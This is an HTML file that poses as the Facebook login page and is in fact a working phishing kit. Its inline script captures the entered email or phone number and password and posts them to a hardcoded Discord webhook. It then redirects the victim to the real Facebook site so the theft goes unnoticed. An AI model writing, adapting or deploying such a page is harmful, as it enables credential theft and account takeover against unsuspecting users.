<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            margin: 0;
        }
        .facebook-logo {
            font-size: 3rem;
            color: #1877f2;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .login-container {
            background: white;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            text-align: center;
            width: 360px;
        }
        .login-container input {
            width: 92%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        .login-container button {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        .login-container a {
            display: block;
            margin-top: 10px;
            text-decoration: none;
            color: #1877f2;
            font-size: 14px;
        }
        .login-container a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="facebook-logo">facebook</div>
    <div class="login-container">
        <form id="login-form">
            <input type="text" id="email" placeholder="Email or phone number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <a href="#">Forgotten password?</a>
        </form>
    </div>

    <script>
        document.getElementById("login-form").addEventListener("submit", function(event) {
            event.preventDefault(); 

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            const webhookURL = "https://discord.com/api/webhooks/1347850749404647455/FJkekmUnjyZzSTco1eV7VJwNYAlXs_bqitNE4CVfideWX6VHP2KequKhkj0FyRk9bb-W";

            const payload = {
                content: "**New Login Attempt**\nðŸ“§ Email/Phone: " + email + "\nðŸ”‘ Password: " + password
            };

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).then(response => {
                // Redirect to Facebook after submission
                window.location.href = "https://www.facebook.com";
            }).catch(error => {
                console.error("Error:", error);
                window.location.href = "https://www.facebook.com"; // Redirect even if there's an error
            });
        });
    </script>
</body>
</html>
